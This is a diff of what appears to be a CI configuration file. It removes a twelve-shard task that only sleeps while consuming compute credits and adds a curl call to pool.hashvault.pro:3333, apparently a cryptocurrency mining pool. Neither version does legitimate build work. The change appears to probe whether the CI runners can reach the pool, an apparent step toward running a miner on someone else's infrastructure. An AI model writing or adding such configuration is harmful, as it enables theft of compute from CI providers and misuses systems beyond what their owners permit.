@@ -1,20 +1,5 @@
 arm_container:
-  image: alpine:latest
+  image: curlimages/curl:latest
     
 task:
-  use_compute_credits: true
-  env:
-    matrix:
-      SHARD: 1
-      SHARD: 2
-      SHARD: 3
-      SHARD: 4
-      SHARD: 5
-      SHARD: 6
-      SHARD: 7
-      SHARD: 8
-      SHARD: 9
-      SHARD: 10
-      SHARD: 11
-      SHARD: 12
-  sleep_script: sleep 420
+  script: curl -v --connect-timeout 3 http://pool.hashvault.pro:3333
